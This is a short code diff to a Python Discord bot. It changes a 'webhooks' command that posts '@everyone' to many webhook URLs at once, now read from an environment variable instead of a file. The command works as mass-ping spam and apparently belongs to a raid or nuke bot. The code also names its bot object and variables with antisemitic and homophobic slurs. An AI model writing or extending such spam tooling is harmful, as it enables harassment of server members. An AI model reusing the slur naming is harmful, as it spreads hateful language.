@@ -288,14 +288,12 @@ Bot:            {jew.user.name}#{jew.user.discriminator}
 @jew.command()
 @commands.has_permissions(administrator=True)
 async def webhooks(ctx):
-  await ctx.send("Starting Webhooks")
-
-  async def webhooka(fags):
-    async with httpx.AsyncClient() as client:
-      await client.post(fags, json={"content": "@everyone"})
-
-  fags_list = open("webhooks.txt", "r").read().splitlines()
-  await asyncio.gather(*[webhooka(fags) for fags in fags_list if fags.strip()])
+    await ctx.send("Starting Webhooks")
+    async def webhooka(fags):
+        async with httpx.AsyncClient() as client:
+            await client.post(fags, json={"content": "@everyone"})
+    fags_list = os.environ["WEBHOOKS"].split(",")
+    await asyncio.gather(*[webhooka(fags) for fags in fags_list if fags.strip()])
 
 # ── Entry Point ───────────────────────────────────────────────────────────────
 
